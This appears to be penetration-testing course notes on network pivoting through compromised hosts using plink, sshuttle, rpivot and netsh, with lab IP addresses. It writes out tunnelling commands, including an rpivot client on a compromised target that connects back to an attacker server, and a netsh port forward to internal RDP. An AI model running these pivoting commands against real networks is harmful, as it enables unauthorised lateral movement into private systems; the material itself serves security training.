## SSH for Windows: plink.exe

[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), sort for PuTTY Link, is a Windows command line SSH tool that comes as part of the PuTTY package when installed. It can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of [2018](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview) there was no native SSH client included with Windows, so [PuTTY](https://www.putty.org/) was a popular choice.

### Getting to Know Plink

![[66.webp]]

The Windows attack host starts a plink.exe process, to create a dynamic port forwarding over the Ubuntu server.

#### Using Plink.exe
```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

[Proxifier](https://www.proxifier.com) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier creates a tunneled network which can operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

![[reverse_shell_9.webp]]

With the profile, we can now directly start mstsc.exe to start an RDP session with a Windows target.

## SSH Pivoting with sshuttle

[Sshuttle](https://github.com/sshuttle/sshuttle) is a tool written in python which removes the need to configure proxychains. However it only works for SSH, and not other options like TOR and HTTPS proxy servers. It can be very useful for automating the execution of iptables and adding pivot rules for the remote host.

### Installing sshuttle
```shell-session
$ sudo apt-get install sshuttle
```

We can use the option `-r` to connect to a remote machine.

### Running sshuttle
```shell-session
$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

### Traffic Routing through iptables Routes
```shell-session
$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

We can now use any tool directly without using proxychains.

## Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. It binds a machine inside corporate network to an external sever and exposes the client's local port on the sever side. In the scenario below we want to access the internal web server.

![[77.webp]]

We can start our rpivot SOCKS proxy server to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

### Cloning rpivot
```shell-session
$ sudo git clone https://github.com/klsecservices/rpivot.git
```

### Installing Python2.7
```shell-session
$ sudo apt-get install python2.7
```

### Running Sever.py from the Attack Host
```shell-session
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Transfering rpivot to the Target
```shell-session
$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### Running client.py from Pivot Target
```shell-session
$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

### Confirming Connection is Established
```shell-session
New connection from host 10.129.202.64, source port 35226
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

### Browsing the Target Web Server using Proxychains
```shell-session
proxychains firefox-esr 172.16.5.135:80
```

In some cases external servers may require authentication, some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the domain controller. In such cases we can provide additional NTLM authentication option to rpivot.

### Connection to a Web Server using HTTP-Proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## Port Forwarding with Windows Netsh

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command line tool that can help with the network configurations of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

Lets take the example below where we compromised the Windows10 User.

![[88.webp]]

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port.

### Using Netsh.exe to Port Forward
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

### Verify Port Forward
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

After configuring portfroxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp.

### Connecting to the Internal Host through the Port Forward
![[netsh_pivot.webp]]

